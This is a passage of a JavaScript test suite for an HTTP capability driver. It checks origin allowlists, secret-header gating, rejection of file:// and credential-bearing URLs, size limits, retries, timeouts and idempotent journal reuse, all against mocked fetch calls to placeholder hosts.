          secretGetCalls += 1;
          return 'Bearer should-not-read';
        },
      };
      const blockedSecretDriver = new GenericHttpJsonCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        secretHeaders: { Authorization: 'API_TOKEN' },
        secretProvider: untouchedSecretProvider,
      });
      const deniedSecretPreflight = blockedSecretDriver.preflight({
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://other.example'],
          allowedMethods: ['POST'],
        },
      }, httpRequest());
      assert.equal(deniedSecretPreflight.accepted, false);
      assert.equal(deniedSecretPreflight.blockers.includes('ERR_CAPABILITY_ORIGIN_DENIED'), true);
      assert.equal(secretHasCalls, 0);
      await assert.rejects(
        () => blockedSecretDriver.resolve({
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://other.example'],
            allowedMethods: ['POST'],
          },
        }, httpRequest()),
        { code: 'ERR_CAPABILITY_ORIGIN_DENIED' },
      );
      assert.equal(secretGetCalls, 0);

      let observedBody = undefined;
      globalThis.fetch = async (url, options) => {
        observedBody = options.body;
        return new Response('{"status":"ok"}', {
          status: 200,
          headers: { 'x-request-id': 'request-null-body' },
        });
      };
      await new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }).resolve({
        policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
      }, {
        ...httpRequest(),
        hostRequestFingerprint: 'world:host-request:00000000000000a6',
        idempotencyKeyBytes: fromUtf8('http-key-null-body'),
        idempotencyKeyWorldFingerprint: 'world:key:http-null-body',
        requestBytes: fromUtf8(stableJson({ url: 'https://allowed.example/decide', method: 'POST', body: null })),
      });
      assert.equal(observedBody, 'null');

      let errorBodyPulled = false;
      globalThis.fetch = async () => new Response(new ReadableStream({
        pull(controller) {
          errorBodyPulled = true;
          controller.enqueue(fromUtf8('http-error-body'));
          controller.close();
        },
      }), {
        status: 500,
        headers: { 'x-request-id': 'request-http-error' },
      });
      const httpError = await new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }).resolve({
        policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
      }, {
        ...httpRequest(),
        hostRequestFingerprint: 'world:host-request:00000000000000a7',
        idempotencyKeyBytes: fromUtf8('http-key-error-body'),
        idempotencyKeyWorldFingerprint: 'world:key:http-error-body',
      });
      assert.equal(decodeResolutionInputBytes(httpError.resolutionInputBytes).status, 1);
      assert.equal(errorBodyPulled, true);

      let retryFetchCount = 0;
      globalThis.fetch = async () => {
        retryFetchCount += 1;
        if (retryFetchCount === 1) throw new TypeError('transient network failure');
        return new Response('{"status":"ok"}', {
          status: 200,
          headers: { 'x-request-id': 'request-retry' },
        });
      };
      const retried = await new GenericHttpJsonCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        retryPolicy: { attempts: 2 },
      }).resolve({
        policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
      }, {
        ...httpRequest(),
        hostRequestFingerprint: 'world:host-request:00000000000000a9',
        idempotencyKeyBytes: fromUtf8('http-key-retry'),
        idempotencyKeyWorldFingerprint: 'world:key:http-retry',
      });
      assert.equal(retryFetchCount, 2);
      assert.equal(decodeResolutionInputBytes(retried.resolutionInputBytes).status, 0);

      let directPostResponseFailureFetchCount = 0;
      globalThis.fetch = async () => {
        directPostResponseFailureFetchCount += 1;
        return new Response('{not-json', {
          status: 200,
          headers: { 'x-request-id': 'request-post-response-failure' },
        });
      };
      const postResponseFailure = await new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          retryPolicy: { attempts: 2 },
        }).resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }, {
          ...httpRequest(),
          hostRequestFingerprint: 'world:host-request:00000000000000ad',
          idempotencyKeyBytes: fromUtf8('http-key-post-response-failure'),
          idempotencyKeyWorldFingerprint: 'world:key:http-post-response-failure',
        });
      assert.equal(decodeResolutionInputBytes(postResponseFailure.resolutionInputBytes).status, 2);
      assert.equal(postResponseFailure.diagnostics.failureCode, 'ERR_HTTP_RESPONSE_VALIDATION_FAILED');
      assert.equal(directPostResponseFailureFetchCount, 1);

      let stalledBodyAborted = false;
      globalThis.fetch = async (url, options) => new Response(new ReadableStream({
        start(controller) {
          controller.enqueue(fromUtf8('{"status":'));
          options.signal.addEventListener('abort', () => {
            stalledBodyAborted = true;
            controller.error(new DOMException('aborted', 'AbortError'));
          }, { once: true });
        },
      }), {
        status: 200,
        headers: { 'x-request-id': 'request-body-timeout' },
      });
      const stalledBodyTimeout = await new GenericHttpJsonCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        timeoutMs: 5,
      }).resolve({
        policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
      }, {
        ...httpRequest(),
        hostRequestFingerprint: 'world:host-request:00000000000000aa',
        idempotencyKeyBytes: fromUtf8('http-key-body-timeout'),
        idempotencyKeyWorldFingerprint: 'world:key:http-body-timeout',
      });
      assert.equal(decodeResolutionInputBytes(stalledBodyTimeout.resolutionInputBytes).status, 4);
      assert.equal(stalledBodyAborted, true);

      let reuseFetchCount = 0;
      globalThis.fetch = async () => {
        reuseFetchCount += 1;
        return new Response('{"action":{"variant":"final","text":"reused"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-reused' },
        });
      };
      const reuseStore = new MemoryStore();
      const reuseJournalOptions = {
        store: reuseStore,
        runId: 'secret-reuse-run',
        branchId: 'main',
        parentTurnClosureFingerprint: 'world:turn-closure:parent',
      };
      const firstSecretRun = await runCapabilityMode({
        mode: 'live',
        driver: new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          secretHeaders: { Authorization: 'API_TOKEN' },
          secretProvider: new EnvSecretProvider({ API_TOKEN: 'Bearer reusable-token' }),
        }),
        hostRequest: httpRequest(),
        journalOptions: reuseJournalOptions,
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(firstSecretRun.reused, false);
      globalThis.fetch = async () => {
        reuseFetchCount += 1;
        throw new Error('reused effect should not fetch');
      };
      const secondSecretRun = await runCapabilityMode({
        mode: 'live',
        driver: new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          secretHeaders: { Authorization: 'API_TOKEN' },
        }),
        hostRequest: httpRequest(),
        journalOptions: reuseJournalOptions,
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(secondSecretRun.reused, true);
      assert.equal(reuseFetchCount, 1);

      let directLimitedRequestFetchCalled = false;
      globalThis.fetch = async () => {
        directLimitedRequestFetchCalled = true;
        return new Response('{"status":"ok"}', { status: 200 });
      };
      await assert.rejects(
        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }).resolve({
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            maximumRequestBytes: 1,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }, httpRequest()),
        { code: 'ERR_CAPABILITY_PROMPT_TOO_LARGE' },
      );
      assert.equal(directLimitedRequestFetchCalled, false);

      assert.throws(
        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'file:///tmp/world-host-capability.json' }),
        { code: 'ERR_HTTP_URL_SCHEME_REJECTED' },
      );
      assert.throws(
        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://user:pass@allowed.example/decide' }),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      assert.throws(
        () => new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          secretHeaders: { 'idempotency-key': 'API_TOKEN' },
        }),
        { code: 'ERR_HTTP_SECRET_HEADER_RESERVED' },
      );
      let credentialUrlFetchCalled = false;
      globalThis.fetch = async () => {
        credentialUrlFetchCalled = true;
        return new Response('{"status":"ok"}', { status: 200 });
      };
      await assert.rejects(
        () => new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          allowEndpointFromRequest: true,
          origins: ['https://allowed.example'],
        }).resolve({
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }, {
          ...httpRequest(),
          requestBytes: fromUtf8(stableJson({ url: 'https://user:pass@allowed.example/decide', method: 'POST', body: { prompt: 'hi' } })),
        }),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      assert.equal(credentialUrlFetchCalled, false);
      await assert.rejects(
        () => new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          allowEndpointFromRequest: true,
          origins: ['https://allowed.example'],
        }).resolve({
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }, {
          ...httpRequest(),
          requestBytes: fromUtf8(stableJson({ url: 'https://allowed.example/token/request-secret-value123456', method: 'POST', body: { prompt: 'hi' } })),
        }),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      assert.equal(credentialUrlFetchCalled, false);

      let nonHttpFetchCalled = false;
      globalThis.fetch = async () => {
        nonHttpFetchCalled = true;
        return new Response('{"status":"ok"}', { status: 200 });
      };
      await assert.rejects(
        () => new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          allowEndpointFromRequest: true,
          origins: ['null', 'https://allowed.example'],
        }).resolve({
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['null'],
            allowedMethods: ['POST'],
          },
        }, {
          ...httpRequest(),
          requestBytes: fromUtf8(stableJson({ url: 'file:///tmp/world-host-capability.json', method: 'POST', body: { prompt: 'hi' } })),
        }),
        { code: 'ERR_HTTP_URL_SCHEME_REJECTED' },
      );
      assert.equal(nonHttpFetchCalled, false);

      let malformedExplicitUrlFetchCalled = false;
      globalThis.fetch = async () => {
        malformedExplicitUrlFetchCalled = true;
        return new Response('{"status":"ok"}', { status: 200 });
      };
      await assert.rejects(
        () => new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          allowEndpointFromRequest: true,
          origins: ['https://allowed.example'],
        }).resolve({
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }, {
          ...httpRequest(),
          requestBytes: fromUtf8(stableJson({ url: '', method: 'POST', body: { prompt: 'hi' } })),
        }),
        { code: 'ERR_HTTP_URL_INVALID' },
      );
      assert.equal(malformedExplicitUrlFetchCalled, false);

      let limitedRequestFetchCalled = false;
      globalThis.fetch = async () => {
        limitedRequestFetchCalled = true;
        return new Response('{"status":"ok"}', { status: 200 });
      };
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'live',
          driver: new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }),
          hostRequest: httpRequest(),
          journalOptions: {
            store: new MemoryStore(),
            runId: 'request-limit-run',
            branchId: 'main',
            parentTurnClosureFingerprint: 'world:turn-closure:parent',
          },
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            maximumRequestBytes: 1,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }),
        { code: 'ERR_CAPABILITY_PROMPT_TOO_LARGE' },
      );
      assert.equal(limitedRequestFetchCalled, false);

      const renderedTemplate = { prompt: 'x'.repeat(128) };
      const renderedLimitedHostRequest = { ...httpRequest(), requestBytes: fromUtf8(stableJson({ body: 'x' })) };
      let renderedLimitedFetchCalled = false;
      globalThis.fetch = async () => {
        renderedLimitedFetchCalled = true;
        return new Response('{"status":"ok"}', { status: 200 });
      };
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'live',
          driver: new GenericHttpJsonCapabilityDriver({
            endpointUrl: 'https://allowed.example/decide',
            requestTemplate: renderedTemplate,
          }),
          hostRequest: renderedLimitedHostRequest,
          journalOptions: {
            store: new MemoryStore(),
            runId: 'rendered-request-limit-run',
            branchId: 'main',
            parentTurnClosureFingerprint: 'world:turn-closure:parent',
          },
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            maximumRequestBytes: renderedLimitedHostRequest.requestBytes.byteLength + 8,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }),
        { code: 'ERR_CAPABILITY_PROMPT_TOO_LARGE' },
      );
      assert.equal(renderedLimitedFetchCalled, false);

      let promptLimitedFetchCalled = false;
      globalThis.fetch = async () => {
        promptLimitedFetchCalled = true;
        return new Response('{"status":"ok"}', { status: 200 });
      };
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'live',
          driver: new GenericHttpJsonCapabilityDriver({
            endpointUrl: 'https://allowed.example/decide',
            requestTemplate: { prompt: 'x'.repeat(128) },
          }),
          hostRequest: { ...httpRequest(), requestBytes: fromUtf8(stableJson({ body: 'x' })) },
          journalOptions: {
            store: new MemoryStore(),
            runId: 'prompt-limit-run',
            branchId: 'main',
            parentTurnClosureFingerprint: 'world:turn-closure:parent',
          },
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            maximumRequestBytes: 4096,
            maximumPromptBytes: 8,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }),
        { code: 'ERR_CAPABILITY_PROMPT_TOO_LARGE' },
      );
      assert.equal(promptLimitedFetchCalled, false);

      let missingAllowlistFetchCalled = false;
      globalThis.fetch = async () => {
        missingAllowlistFetchCalled = true;
        return new Response('{"status":"ok"}', { status: 200 });
      };
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'live',
          driver: new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }),
          hostRequest: { ...httpRequest(), requestBytes: fromUtf8(stableJson({ body: { prompt: 'hi' } })) },
          journalOptions: {
            store: new MemoryStore(),
            runId: 'missing-allowlist-run',
            branchId: 'main',
            parentTurnClosureFingerprint: 'world:turn-closure:parent',
          },
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
          },
        }),
        { code: 'ERR_CAPABILITY_ORIGIN_ALLOWLIST_REQUIRED' },
      );
      assert.equal(missingAllowlistFetchCalled, false);

      let configuredEndpointFetchCalled = false;
      globalThis.fetch = async () => {
        configuredEndpointFetchCalled = true;
        return new Response('{"action":{"variant":"final","text":"configured"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-configured' },
        });
      };
      const configuredEndpointRequest = { ...httpRequest(), requestBytes: fromUtf8(stableJson({ body: { prompt: 'hi' } })) };
      const configuredEndpointJournalOptions = {
        store: new MemoryStore(),
        runId: 'configured-endpoint-run',
        branchId: 'main',
        parentTurnClosureFingerprint: 'world:turn-closure:parent',
      };
      const configuredEndpointLive = await runCapabilityMode({
        mode: 'live',
        driver: new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }),
        hostRequest: configuredEndpointRequest,
        journalOptions: configuredEndpointJournalOptions,
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(configuredEndpointFetchCalled, true);
      assert.equal(decodeResolutionInputBytes(configuredEndpointLive.resolutionInputBytes).status, 0);
      globalThis.fetch = async () => {
        throw new Error('configured endpoint reuse should be blocked by current policy');
      };
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'live',
          driver: new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }),
          hostRequest: configuredEndpointRequest,
          journalOptions: configuredEndpointJournalOptions,
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://other.example'],
            allowedMethods: ['POST'],
          },
        }),
        { code: 'ERR_CAPABILITY_ORIGIN_DENIED' },
      );
      let configuredEndpointReuseFetchCalled = false;
      globalThis.fetch = async () => {
        configuredEndpointReuseFetchCalled = true;
        return new Response('{"action":{"variant":"final","text":"other"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-configured-other' },
        });
      };
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'live',
          driver: new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://other.example/decide' }),
          hostRequest: configuredEndpointRequest,
          journalOptions: configuredEndpointJournalOptions,
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://other.example'],
            allowedMethods: ['POST'],
          },
        }),
        { code: 'ERR_EFFECT_IDEMPOTENCY_CONFLICT' },
      );
      assert.equal(configuredEndpointReuseFetchCalled, false);

      let requestTemplateIdentityFetchCount = 0;
      globalThis.fetch = async (url, options) => {
        requestTemplateIdentityFetchCount += 1;
        assert.equal(url, 'https://allowed.example/decide');
        assert.equal(options.body, stableJson({ prompt: 'template-a' }));
        return new Response('{"action":{"variant":"final","text":"template-a"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-template-a' },
        });
      };
      const requestTemplateIdentityRequest = {
        ...httpRequest(),
        hostRequestFingerprint: 'world:host-request:00000000000000a7',
        idempotencyKeyBytes: fromUtf8('http-key-request-template-identity'),
        idempotencyKeyWorldFingerprint: 'world:key:http-request-template-identity',
        requestBytes: fromUtf8(stableJson({ body: { prompt: 'hi' } })),
      };
      const requestTemplateIdentityJournalOptions = {
        store: new MemoryStore(),
        runId: 'request-template-identity-run',
        branchId: 'main',
        parentTurnClosureFingerprint: 'world:turn-closure:parent',
      };
      await runCapabilityMode({
        mode: 'live',
        driver: new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          requestTemplate: { prompt: 'template-a' },
        }),
        hostRequest: requestTemplateIdentityRequest,
        journalOptions: requestTemplateIdentityJournalOptions,
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      globalThis.fetch = async () => {
        throw new Error('request template identity conflict should block before fetch');
      };
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'live',
          driver: new GenericHttpJsonCapabilityDriver({
            endpointUrl: 'https://allowed.example/decide',
            requestTemplate: { prompt: 'template-b' },
          }),
          hostRequest: requestTemplateIdentityRequest,
          journalOptions: requestTemplateIdentityJournalOptions,
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }),
        { code: 'ERR_EFFECT_IDEMPOTENCY_CONFLICT' },
      );
      assert.equal(requestTemplateIdentityFetchCount, 1);

      let configuredPayloadUrlFetchUrl = null;
      globalThis.fetch = async (url) => {
        configuredPayloadUrlFetchUrl = url;
        return new Response('{"action":{"variant":"final","text":"configured-payload-url"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-configured-payload-url' },
        });
      };
      await runCapabilityMode({
        mode: 'live',
        driver: new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }),
        hostRequest: {
          ...httpRequest(),
          hostRequestFingerprint: 'world:host-request:00000000000000a4',
          idempotencyKeyBytes: fromUtf8('http-key-configured-payload-url'),
          idempotencyKeyWorldFingerprint: 'world:key:http-configured-payload-url',
          requestBytes: fromUtf8(stableJson({ url: 'https://denied.example/data', prompt: 'payload data only' })),
        },
        journalOptions: {
          store: new MemoryStore(),
          runId: 'configured-payload-url-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(configuredPayloadUrlFetchUrl, 'https://allowed.example/decide');

      let tinyBodyFetchCalled = false;
      globalThis.fetch = async () => {
        tinyBodyFetchCalled = true;
        return new Response('{"action":{"variant":"final","text":"tiny-body"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-tiny-body' },
        });
      };
      const tinyBodyDriver = new GenericHttpJsonCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        maximumRequestBytes: 2,
      });
      await runCapabilityMode({
        mode: 'live',
        driver: tinyBodyDriver,
        hostRequest: {
          ...httpRequest(),
          hostRequestFingerprint: 'world:host-request:00000000000000a5',
          idempotencyKeyBytes: fromUtf8('http-key-tiny-body'),
          idempotencyKeyWorldFingerprint: 'world:key:http-tiny-body',
          requestBytes: fromUtf8(stableJson({ body: {} })),
        },
        journalOptions: {
          store: new MemoryStore(),
          runId: 'tiny-body-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(tinyBodyFetchCalled, true);

      let defaultMethod = null;
      globalThis.fetch = async (url, options) => {
        defaultMethod = options.method;
        return new Response('{"action":{"variant":"final","text":"default-method"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-default-method' },
        });
      };
      await runCapabilityMode({
        mode: 'live',
        driver: new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://fallback.example/decide',
          allowEndpointFromRequest: true,
          origins: ['https://allowed.example', 'https://fallback.example'],
        }),
        hostRequest: {
          ...httpRequest(),
          hostRequestFingerprint: 'world:host-request:00000000000000a3',
          idempotencyKeyBytes: fromUtf8('http-key-default-method'),
          idempotencyKeyWorldFingerprint: 'world:key:http-default-method',
          requestBytes: fromUtf8(stableJson({ url: 'https://allowed.example/decide', body: { prompt: 'hi' } })),
        },
        journalOptions: {
          store: new MemoryStore(),
          runId: 'default-method-run',
          branchId: 'main',
          parentTurnClosureFingerprint: 'world:turn-closure:parent',
        },
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(defaultMethod, 'POST');

      let defaultMethodIdentityFetchCount = 0;
      globalThis.fetch = async (url, options) => {
        defaultMethodIdentityFetchCount += 1;
        assert.equal(url, 'https://allowed.example/decide');
        assert.equal(options.method, 'POST');
        return new Response('{"action":{"variant":"final","text":"default-method-identity"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-default-method-identity' },
        });
      };
      const defaultMethodIdentityRequest = {
        ...httpRequest(),
        hostRequestFingerprint: 'world:host-request:00000000000000a6',
        idempotencyKeyBytes: fromUtf8('http-key-default-method-identity'),
        idempotencyKeyWorldFingerprint: 'world:key:http-default-method-identity',
        requestBytes: fromUtf8(stableJson({ url: 'https://allowed.example/decide', body: { prompt: 'hi' } })),
      };
      const defaultMethodIdentityJournalOptions = {
        store: new MemoryStore(),
        runId: 'default-method-identity-run',
        branchId: 'main',
        parentTurnClosureFingerprint: 'world:turn-closure:parent',
      };
      await runCapabilityMode({
        mode: 'live',
        driver: new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://fallback.example/decide',
          allowEndpointFromRequest: true,
          origins: ['https://allowed.example', 'https://fallback.example'],
          methods: ['POST', 'PUT'],
        }),
        hostRequest: defaultMethodIdentityRequest,
        journalOptions: defaultMethodIdentityJournalOptions,
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST', 'PUT'],
        },
      });
      globalThis.fetch = async () => {
        throw new Error('defaulted method identity conflict should block before fetch');
      };
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'live',
          driver: new GenericHttpJsonCapabilityDriver({
            endpointUrl: 'https://fallback.example/decide',
            allowEndpointFromRequest: true,
            origins: ['https://allowed.example', 'https://fallback.example'],
            methods: ['PUT'],
          }),
          hostRequest: defaultMethodIdentityRequest,
          journalOptions: defaultMethodIdentityJournalOptions,
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST', 'PUT'],
          },
        }),
        { code: 'ERR_EFFECT_IDEMPOTENCY_CONFLICT' },
      );
      assert.equal(defaultMethodIdentityFetchCount, 1);

      let explicitRenderingFetchCount = 0;
      globalThis.fetch = async (url, options) => {
        explicitRenderingFetchCount += 1;
        assert.equal(url, 'https://allowed.example/decide');
        assert.equal(options.method, 'POST');
        assert.equal(options.body, '{"prompt":"first"}');
        return new Response('{"action":{"variant":"final","text":"explicit-rendering"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-explicit-rendering' },
        });
      };
      const explicitRenderingRequest = {
        ...httpRequest(),
        hostRequestFingerprint: 'world:host-request:00000000000000a7',
        idempotencyKeyBytes: fromUtf8('http-key-explicit-rendering'),
        idempotencyKeyWorldFingerprint: 'world:key:http-explicit-rendering',
        requestBytes: fromUtf8(stableJson({ url: 'https://allowed.example/decide', method: 'POST', body: { prompt: 'hi' } })),
      };
      const explicitRenderingJournalOptions = {
        store: new MemoryStore(),
        runId: 'explicit-rendering-run',
        branchId: 'main',
        parentTurnClosureFingerprint: 'world:turn-closure:parent',
      };
      await runCapabilityMode({
        mode: 'live',
        driver: new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://fallback.example/decide',
          allowEndpointFromRequest: true,
          origins: ['https://allowed.example', 'https://fallback.example'],
          requestTemplate: { prompt: 'first' },
        }),
        hostRequest: explicitRenderingRequest,
        journalOptions: explicitRenderingJournalOptions,
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      globalThis.fetch = async () => {
        throw new Error('request rendering identity conflict should block before fetch');
      };
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'live',
          driver: new GenericHttpJsonCapabilityDriver({
            endpointUrl: 'https://fallback.example/decide',
            allowEndpointFromRequest: true,
            origins: ['https://allowed.example', 'https://fallback.example'],
            requestTemplate: { prompt: 'second' },
          }),
          hostRequest: explicitRenderingRequest,
          journalOptions: explicitRenderingJournalOptions,
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }),
        { code: 'ERR_EFFECT_IDEMPOTENCY_CONFLICT' },
      );
      assert.equal(explicitRenderingFetchCount, 1);

      let shadowFetchCalled = false;
      globalThis.fetch = async () => {
        shadowFetchCalled = true;
        return new Response('{"status":"ok"}', { status: 200 });
      };
      const httpShadow = await runCapabilityMode({
        mode: 'shadow',
        driver: new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }),
        hostRequest: httpRequest(),
        context: { allowShadowNetwork: true },
        recordedResolution: null,
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      });
      assert.equal(httpShadow.shadow.liveInvoked, false);
      assert.equal(shadowFetchCalled, false);

      const envelopeDriver = new GenericHttpJsonCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        maximumResponseBytes: 4,
      });
      assert.equal(envelopeDriver.manifest().maximumResponseBytes > 4, true);
      globalThis.fetch = async () => new Response('1234', { status: 200 });
      const envelopeResult = await envelopeDriver.resolve({
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
          maximumResponseBytes: envelopeDriver.manifest().maximumResponseBytes,
        },
      }, httpRequest());
      assert.equal(envelopeResult.resolutionInputBytes.byteLength <= envelopeDriver.manifest().maximumResponseBytes, true);

      globalThis.fetch = async () => new Response(new ReadableStream({
        start(controller) {
          controller.enqueue(new Uint8Array(8));
          controller.enqueue(new Uint8Array(8));
          controller.close();
        },
      }), { status: 200 });
      const limitedDriver = new GenericHttpJsonCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        maximumResponseBytes: 10,
      });
      const limitedResult = await limitedDriver.resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }, httpRequest());
      assert.equal(decodeResolutionInputBytes(limitedResult.resolutionInputBytes).status, 2);
      assert.equal(limitedResult.diagnostics.failureCode, 'ERR_HTTP_RESPONSE_TOO_LARGE');

      let postResponseFailureFetchCount = 0;
      globalThis.fetch = async () => {
        postResponseFailureFetchCount += 1;
        return new Response('{not-json', {
          status: 200,
          headers: { 'x-request-id': 'post-response-validation-failed' },
        });
      };
      const postResponseStore = new MemoryStore();
      await assert.rejects(
        () => runCapabilityMode({
          mode: 'live',
          driver: new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' }),
          hostRequest: {
            ...httpRequest(),
            hostRequestFingerprint: 'world:host-request:00000000000000af',
            idempotencyKeyBytes: fromUtf8('http-post-response-validation-failed'),
            idempotencyKeyWorldFingerprint: 'world:key:http-post-response-validation-failed',
          },
          journalOptions: {
            store: postResponseStore,
            runId: 'http-post-response-validation-failed-run',
            branchId: 'main',
            parentTurnClosureFingerprint: 'world:turn-closure:parent',
          },
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }),
        { code: 'ERR_EFFECT_RESPONSE_STATUS_MISMATCH' },
      );
      const postResponseRecords = await postResponseStore.listEffectRecords('http-post-response-validation-failed-run');
      assert.equal(postResponseRecords.length, 1);
